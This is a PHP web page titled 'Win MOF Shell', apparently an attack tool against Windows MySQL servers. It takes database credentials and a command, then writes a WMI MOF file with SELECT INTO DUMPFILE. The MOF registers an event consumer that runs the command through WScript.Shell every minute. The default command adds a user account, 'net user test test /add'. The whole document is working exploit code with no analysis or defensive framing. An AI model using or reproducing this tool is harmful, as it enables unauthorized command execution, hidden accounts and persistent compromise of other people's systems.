<html>
<head><title>Win MOF Shell</title></head>
<body>
<form action="" method="post">
Host:<br/>
<input type="text" name="host" value="127.0.0.1:3306"><br/>
User:<br/>
<input type="text" name="user" value="root"><br/>
Pass:<br/>
<input type="password" name="pass" value=""><br/>
DBname:<br/>
<input type="text" name="dbname" value="mysql"><br/>
Cmd:<br/>
<input type="text" name="cmd" value="net user test test /add" size="35"><br/>
MofPath:<br/>
<input type="text" name="mofname" value="c:/windows/system32/wbem/mof/hacking.mof" size="35"><br/>
<input type="submit" value="Exploit"><br/>
</form>
</body>
</html>
<?php
if(isset($_REQUEST['host'])&&isset($_REQUEST['user'])&&isset($_REQUEST['dbname'])&&isset($_REQUEST['cmd'])&&isset($_REQUEST['mofname']))
{
	$mysql_server_name=$_REQUEST['host'];
	$mysql_username=$_REQUEST['user'];
	if(isset($_REQUEST['pass']))
	{
		$mysql_password=$_REQUEST['pass'];
	}
	else
	{
		$mysql_password='';
	}
	$mysql_database=$_REQUEST['dbname'];
	$cmdshell=$_REQUEST['cmd'];
	$mofname=$_REQUEST['mofname'];
}
else
{
	echo "Form Input not enough";
	exit;
}
$conn=mysql_connect($mysql_server_name,$mysql_username,$mysql_password,$mysql_database);

$payload = "#pragma namespace(\"\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\subscription\")

instance of __EventFilter as \$EventFilter
{
	EventNamespace = \"Root\\\\\\\\Cimv2\";
	Name  = \"filtP2\";
	Query = \"Select * From __InstanceModificationEvent \"
			\"Where TargetInstance Isa \\\\\"Win32_LocalTime\\\\\" \"
			\"And TargetInstance.Second = 5\";
	QueryLanguage = \"WQL\";
};

instance of ActiveScriptEventConsumer as \$Consumer
{
	Name = \"consPCSV2\";
	ScriptingEngine = \"JScript\";
	ScriptText = 
	\"var WSH = new ActiveXObject(\\\\\"WScript.Shell\\\\\")\\\\nWSH.run(\\\\\"$cmdshell\\\\\")\";
};

instance of __FilterToConsumerBinding
{
	Consumer = \$Consumer;
	Filter = \$EventFilter;
};";

mysql_select_db($mysql_database,$conn);
$sql="select '$payload' into dumpfile '$mofname';";
if(mysql_query($sql))
{
	echo "Exploit Success!!!";
}
mysql_close($conn);
?>